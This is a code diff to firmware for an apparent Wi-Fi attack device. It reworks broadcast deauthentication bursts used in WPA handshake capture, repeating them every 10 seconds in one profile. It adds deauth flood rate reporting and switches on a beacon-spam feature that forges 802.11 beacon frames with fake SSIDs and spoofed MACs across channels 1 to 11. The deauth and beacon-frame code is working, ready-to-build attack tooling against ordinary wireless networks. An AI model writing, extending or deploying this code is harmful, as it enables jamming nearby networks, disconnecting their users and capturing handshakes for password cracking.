@@ -1,4 +1,5 @@
-/* Clean-room implementation from MonstaTek contract. Portable: no ESP-IDF
+/* Canonical Core service with historical Wi-Fi behavior reconciled as described
+ * in docs/CUMULATIVE_CORE.md. Portable: no ESP-IDF
  * dependency, host-testable against mtek_wifi_hal_t (fake HAL for host tests,
  * real ESP-IDF HAL on target). */
 #include "mtek_wifi_service.h"
@@ -9,6 +10,7 @@
 #include "mtek_router.h"
 #include <string.h>
 #include <stdint.h>
+#include <stdlib.h>
 
 /* The (service_id, originating
  * START opcode) each token-addressed handler passes to the mtk_op_*_family core
@@ -68,8 +70,13 @@ static int op_is_terminal_now(uint32_t token, uint32_t boot_epoch) {
 void mtek_wifi_set_hal(const mtk_wifi_hal_t *hal) { s_hal = hal; }
 const mtk_wifi_hal_t *mtek_wifi_get_hal(void) { return s_hal; }
 void mtek_wifi_service_init(uint64_t (*now_ms_fn)(void)) { s_now_ms = now_ms_fn; }
+static void beacon_tick(void);
+static void handshake_tx_tick(void);
+static void beacon_finish(uint32_t token, uint32_t epoch, uint8_t status);
 void mtek_wifi_service_tick(void) {
+    beacon_tick();
     if (s_hal && s_hal->promisc_service) s_hal->promisc_service();
+    handshake_tx_tick();
     /* Drains queued captive-portal submissions, for a HAL that defers delivery
      * out of its HTTP server's own task rather than calling straight through. */
     if (s_hal && s_hal->portal_service) s_hal->portal_service();
@@ -975,6 +982,8 @@ static void handle_deauth_start(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t
      * silently skipping this operation's own send loop entirely -- a real bug
      * the TSan-driven fix introduced and caught before it shipped. */
     uint32_t my_token = id.token, my_epoch = id.boot_epoch;
+    uint64_t progress_ms = now_ms();
+    uint32_t progress_sent = 0;
     while (!op_is_terminal_now(my_token, my_epoch)) {
         for (unsigned i = 0; i < target_count && !op_is_terminal_now(my_token, my_epoch); i++) {
             int rc = -1;
@@ -987,6 +996,16 @@ static void handle_deauth_start(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t
             if (budget && attempted >= budget) goto deauth_loop_done;
         }
         if (op_is_terminal_now(my_token, my_epoch)) break;
+        uint64_t progress_now = now_ms();
+        if (progress_now - progress_ms >= 1000) {
+            uint64_t rate = (uint64_t)(total_sent - progress_sent) * 1000 / (progress_now - progress_ms);
+            mtk_deauth_progress_ev_t ev = {my_token, (uint16_t)(rate > 65535 ? 65535 : rate), 0};
+            if (mtk_op_begin_publish_guard(ctx->session_generation)) {
+                ctx->sink.emit_event(ctx->sink.user,my_token,"DEAUTH_PROGRESS",&ev,&mtk_deauth_progress_ev_t_desc);
+                mtk_op_end_publish_guard();
+            }
+            progress_ms = progress_now; progress_sent = total_sent;
+        }
         /* count=0 with no background execution context available: one
          * round-robin pass is the most this call can honestly do (see
          * the doc comment above) -- stop here rather than spinning
@@ -1128,6 +1147,9 @@ typedef struct {
      * for. */
     mtk_mac6_t target_bssid;
     uint8_t channel;
+    uint8_t tx_armed;
+    uint16_t tx_remaining, tx_repeat;
+    uint64_t tx_due;
 } handshake_session_t;
 static handshake_session_t s_hs;
 
@@ -1224,6 +1246,7 @@ static void handshake_finish(uint32_t token, uint32_t boot_epoch, mtk_op_state_t
      * handle_handshake_stop, whose own STOP-caller session is not necessarily
      * this long-lived session's originating one. */
     wifi_lock();
+    s_hs.tx_armed = 0; s_hs.tx_remaining = 0; s_hs.tx_repeat = 0;
     uint32_t captured_len = s_hs.len;
     mtk_sink_t sink = s_hs.sink;
     uint32_t session_generation = s_hs.session_generation;
@@ -1449,6 +1472,7 @@ static void handle_handshake_start(mtk_request_ctx_t *ctx, const mtk_opcode_entr
      * against it later. */
     s_hs.session_generation = ctx->session_generation;
     s_hs.target_bssid = req.target_bssid; s_hs.channel = req.channel;
+    s_hs.tx_armed = 1;
     wifi_unlock();
 
     mtk_handshake_start_resp_t r; r.operation_token = id.token;
@@ -1474,12 +1498,15 @@ static void handle_handshake_start(mtk_request_ctx_t *ctx, const mtk_opcode_entr
         handshake_finish(id.token, id.boot_epoch, MTK_OPS_FAILED, MTK_STATUS_IO_ERROR);
         return;
     }
-    for (uint16_t i = 0; i < req.deauth_count; i++) {
-        if (s_hal && s_hal->send_deauth) {
-            mtk_hal_mac6_t bcast; memset(bcast.b, 0xFF, 6);
-            s_hal->send_deauth(to_hal_mac(req.target_bssid), bcast, req.channel);
-        }
+    wifi_lock();
+    if (s_hs.token == id.token && s_hs.tx_armed) {
+        s_hs.tx_remaining = req.deauth_count;
+        /* Legacy menu workflow: 3s paced burst, then 10s receive window.
+         * Native/SPI requested counts remain finite; count=0 stays passive. */
+        s_hs.tx_repeat = ctx->profile == MTK_PROFILE_FACTORY_UART ? req.deauth_count : 0;
+        s_hs.tx_due = now_ms();
     }
+    wifi_unlock();
     /* HAL fake delivers captured frames synchronously inside promisc_start
      * for host tests -- if that already drove this capture to natural
      * M4 completion, hs_frame_cb's own handshake_finish call (above, via
@@ -1490,6 +1517,21 @@ static void handle_handshake_start(mtk_request_ctx_t *ctx, const mtk_opcode_entr
      * function returns immediately after arming capture -- cleanup then
      * happens later, whenever hs_frame_cb or handle_handshake_stop
      * actually wins the race (handshake_finish, above/below). */
+}
+
+static void handshake_tx_tick(void) {
+    wifi_lock();
+    if (!s_hs.tx_armed || !s_hs.tx_remaining || now_ms() < s_hs.tx_due) { wifi_unlock(); return; }
+    uint32_t token=s_hs.token, epoch=s_hs.boot_epoch;
+    mtk_hal_mac6_t broadcast; memset(broadcast.b,0xff,6);
+    int rc=s_hal && s_hal->send_deauth ? s_hal->send_deauth(to_hal_mac(s_hs.target_bssid),broadcast,s_hs.channel) : -1;
+    s_hs.tx_remaining--;
+    s_hs.tx_due=now_ms()+20;
+    if (!s_hs.tx_remaining && s_hs.tx_repeat) {
+        s_hs.tx_remaining=s_hs.tx_repeat; s_hs.tx_due=now_ms()+10000;
+    }
+    wifi_unlock();
+    if (rc) handshake_finish(token,epoch,MTK_OPS_FAILED,MTK_STATUS_IO_ERROR);
 }
 
 static void handle_handshake_status(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
@@ -1560,6 +1602,111 @@ static void handle_handshake_stop(mtk_request_ctx_t *ctx, const mtk_opcode_entry
     respond(ctx, MTK_STATUS_OK, &r, &mtk_handshake_stop_resp_t_desc);
 }
 
+/* Beacon wire layout and 1..11 channel coverage restored from 78e6543.
+ * Scheduling, ownership, cancellation and transport stay in current Core.
+ * One bounded frame per tick; STOP joins the in-flight HAL call via wifi_lock.
+ * SSID storage exists only during the operation (no permanent 1KB buffer). */
+#if CONFIG_MTEK_MODULE_BEACON_VARIANTS
+static struct {
+    mtk_beacon_start_req_t *req;
+    uint32_t token, epoch, generation;
+    mtk_sink_t sink;
+    uint64_t next_ms;
+    unsigned index;
+    uint16_t channels;
+    uint8_t channel;
+} s_beacon;
+
+static void beacon_finish(uint32_t token, uint32_t epoch, uint8_t status) {
+    if (!mtk_op_claim_finalization(token, epoch)) return;
+    wifi_lock();
+    if (s_beacon.token != token) { wifi_unlock(); return; }
+    free(s_beacon.req); s_beacon.req = NULL;
+    mtk_sink_t sink = s_beacon.sink;
+    uint32_t generation = s_beacon.generation;
+    wifi_unlock();
+    if (mtek_wifi_restore_and_release(MTK_ARB_BEACON, token) != 0) status = MTK_STATUS_IO_ERROR;
+    mtk_op_transition_by_token(token, epoch, status == MTK_STATUS_OK ? MTK_OPS_STOPPED : MTK_OPS_FAILED, status, now_ms());
+    if (mtk_op_begin_publish_guard(generation)) {
+        mtk_beacon_stopped_ev_t ev = {token, status};
+        if (sink.emit_event) sink.emit_event(sink.user, token, "BEACON_STOPPED", &ev, &mtk_beacon_stopped_ev_t_desc);
+        mtk_op_end_publish_guard();
+    }
+}
+static void beacon_tick(void) {
+    wifi_lock();
+    if (!s_beacon.req || now_ms() < s_beacon.next_ms) { wifi_unlock(); return; }
+    uint32_t token = s_beacon.token, epoch = s_beacon.epoch;
+    mtk_bytes32_t *ssid = &s_beacon.req->ssids.items[s_beacon.index];
+    uint8_t b[96] = {0x80, 0};
+    memset(b+4, 0xff, 6);
+    uint8_t mac[6] = {0x02, 0x4d, 0x31, (uint8_t)(token >> 8), (uint8_t)token, (uint8_t)s_beacon.index};
+    memcpy(b+10, mac, 6); memcpy(b+16, mac, 6);
+    b[32]=0x64; b[34]=0x01; b[35]=0x04; /* open ESS, short slot; no false privacy bit */
+    b[36]=0; b[37]=(uint8_t)ssid->len; memcpy(b+38, ssid->data, ssid->len);
+    unsigned n=38+ssid->len;
+    const uint8_t rates[]={1,8,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c};
+    memcpy(b+n,rates,sizeof(rates)); n+=sizeof(rates);
+    b[n++]=3; b[n++]=1; b[n++]=s_beacon.channel;
+    int rc = s_hal && s_hal->set_channel ? s_hal->set_channel(s_beacon.channel) : -1;
+    if (!rc) rc = s_hal && s_hal->raw_tx ? s_hal->raw_tx(b,(uint16_t)n) : -1;
+    if (!rc) s_beacon.channels |= (uint16_t)(1u << (s_beacon.channel-1));
+    if (++s_beacon.channel > 11) {
+        s_beacon.channel=1;
+        s_beacon.index=(s_beacon.index+1)%s_beacon.req->ssids.count;
+    }
+    s_beacon.next_ms=now_ms()+10;
+    wifi_unlock();
+    if (rc) beacon_finish(token,epoch,MTK_STATUS_IO_ERROR);
+}
+static void handle_beacon_start(mtk_request_ctx_t *ctx,const mtk_opcode_entry_t *op,const uint8_t *bytes,size_t len) {
+    mtk_beacon_start_req_t *req=calloc(1,sizeof(*req));
+    if (!req) { respond_empty(ctx,MTK_STATUS_NO_MEMORY); return; }
+    if (mtk_decode(op->req_desc,req,bytes,len,NULL)!=MTK_CODEC_OK) { free(req); respond_empty(ctx,MTK_STATUS_PROTOCOL_ERROR); return; }
+    int valid=req->ssids.count>0 && req->ssids.count<=32;
+    for (unsigned i=0; valid && i<req->ssids.count; i++) valid=req->ssids.items[i].len>0 && req->ssids.items[i].len<=32;
+    if (!valid) { free(req); respond_empty(ctx,MTK_STATUS_INVALID_ARGUMENT); return; }
+    if (!mtk_op_begin_admission_guard(ctx->session_generation)) { free(req); respond_empty(ctx,MTK_STATUS_NOT_READY); return; }
+    int no_mem=0;
+    mtk_op_id_t id=mtk_op_alloc_id(op->service_id,op->opcode,now_ms(),&no_mem);
+    if (!id.token) { free(req); respond_empty(ctx,MTK_STATUS_NO_MEMORY); mtk_op_end_admission_guard(); return; }
+    if (mtk_arbiter_acquire(MTK_ARB_BEACON,id.token)!=MTK_ARB_GRANT_OK) {
+        free(req); mtk_op_discard_unpublished(id.token,id.boot_epoch); respond_empty(ctx,MTK_STATUS_BUSY); mtk_op_end_admission_guard(); return;
+    }
+    mtk_op_transition_by_token(id.token,id.boot_epoch,MTK_OPS_RUNNING,MTK_STATUS_OK,now_ms());
+    wifi_lock();
+    memset(&s_beacon,0,sizeof(s_beacon));
+    s_beacon.req=req; s_beacon.token=id.token; s_beacon.epoch=id.boot_epoch;
+    s_beacon.generation=ctx->session_generation; s_beacon.sink=ctx->sink; s_beacon.channel=1;
+    wifi_unlock();
+    mtk_beacon_start_resp_t r={id.token};
+    respond(ctx,MTK_STATUS_ACCEPTED,&r,&mtk_beacon_start_resp_t_desc);
+    mtk_op_end_admission_guard();
+}
+static void handle_beacon_control(mtk_request_ctx_t *ctx,const mtk_opcode_entry_t *op,const uint8_t *bytes,size_t len) {
+    mtk_beacon_stop_req_t req={0};
+    if (mtk_decode(op->req_desc,&req,bytes,len,NULL)!=MTK_CODEC_OK) { respond_empty(ctx,MTK_STATUS_PROTOCOL_ERROR); return; }
+    mtk_operation_record_t snap;
+    if (!mtk_op_snapshot_family(req.operation_token,ctx->boot_epoch,WIFI_SERVICE_ID,0x000D,&snap)) { respond_empty(ctx,MTK_STATUS_NOT_FOUND); return; }
+    if (op->opcode==0x000E) {
+        beacon_finish(req.operation_token,ctx->boot_epoch,MTK_STATUS_OK);
+        mtk_op_snapshot(req.operation_token,ctx->boot_epoch,&snap);
+        mtk_beacon_stop_resp_t r={(uint8_t)snap.state,snap.final_status};
+        respond(ctx,MTK_STATUS_OK,&r,&mtk_beacon_stop_resp_t_desc);
+    } else {
+        mtk_beacon_status_resp_t r={(uint8_t)snap.state,0};
+        wifi_lock();
+        if (s_beacon.req && s_beacon.token==req.operation_token)
+            for (unsigned c=0;c<11;c++) r.channels_active_count+=(s_beacon.channels>>c)&1;
+        wifi_unlock();
+        respond(ctx,MTK_STATUS_OK,&r,&mtk_beacon_status_resp_t_desc);
+    }
+}
+#else
+static void beacon_tick(void) {}
+static void beacon_finish(uint32_t t,uint32_t e,uint8_t s) { (void)t; (void)e; (void)s; }
+#endif
+
 /* Wi-Fi stop-all / recovery / mode / mac / raw TX ---------- */
 
 static void handle_wifi_stop_all(mtk_request_ctx_t *ctx) {
@@ -1590,7 +1737,11 @@ static void handle_wifi_stop_all(mtk_request_ctx_t *ctx) {
          * connect's/handle_ap_scan_start's/handle_sta_scan_start's own, already
          * token-ownership-gated) safely restores/releases, once its blocking
          * call actually returns. */
-        if (active == MTK_ARB_WMC) {
+        if (active == MTK_ARB_H && !mtek_wifi_radio_is_quarantined()) {
+            handshake_finish(tok, ctx->boot_epoch, MTK_OPS_STOPPED, MTK_STATUS_OK);
+        } else if (active == MTK_ARB_BEACON && !mtek_wifi_radio_is_quarantined()) {
+            beacon_finish(tok, ctx->boot_epoch, MTK_STATUS_OK);
+        } else if (active == MTK_ARB_WMC) {
             mtk_op_transition_by_token(tok, ctx->boot_epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, now_ms());
         } else if (active == MTK_ARB_WS) {
             wifi_quiesce_and_fence_ws(tok, ctx->boot_epoch);
@@ -1676,10 +1827,13 @@ mtk_op_id_t mtek_wifi_cancel_active_for_peer_reset(void) {
     mtk_arbiter_snapshot_t snap = mtk_arbiter_snapshot();
     mtk_arbiter_class_t active = snap.cls;
     if (active != MTK_ARB_D && active != MTK_ARB_H && active != MTK_ARB_WMC &&
-        active != MTK_ARB_WS && active != MTK_ARB_SAP) return id;
+        active != MTK_ARB_WS && active != MTK_ARB_SAP && active != MTK_ARB_BEACON) return id;
     uint32_t tok = snap.token;
     uint32_t epoch = mtk_core_boot_epoch();
     switch (active) {
+        case MTK_ARB_BEACON:
+            beacon_finish(tok, epoch, MTK_STATUS_OK);
+            break;
         case MTK_ARB_D:
             deauth_finalize(tok, epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, NULL);
             break;
@@ -2287,7 +2441,8 @@ static void mtek_wifi_dispatch(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t 
          * wire status (UNSUPPORTED, no side effect) that a DISABLED
          * capability would. */
 #if CONFIG_MTEK_MODULE_BEACON_VARIANTS
-        case 0x000D: case 0x000E: case 0x000F: respond_empty(ctx, MTK_STATUS_UNSUPPORTED); return; /* BEACON_START/STOP/STATUS */
+        case 0x000D: handle_beacon_start(ctx, op, req_bytes, req_len); return;
+        case 0x000E: case 0x000F: handle_beacon_control(ctx, op, req_bytes, req_len); return;
 #endif
 #if CONFIG_MTEK_MODULE_PROBE_FLOOD
         case 0x001C: case 0x001D: respond_empty(ctx, MTK_STATUS_UNSUPPORTED); return; /* PROBE_FLOOD_START/STOP */
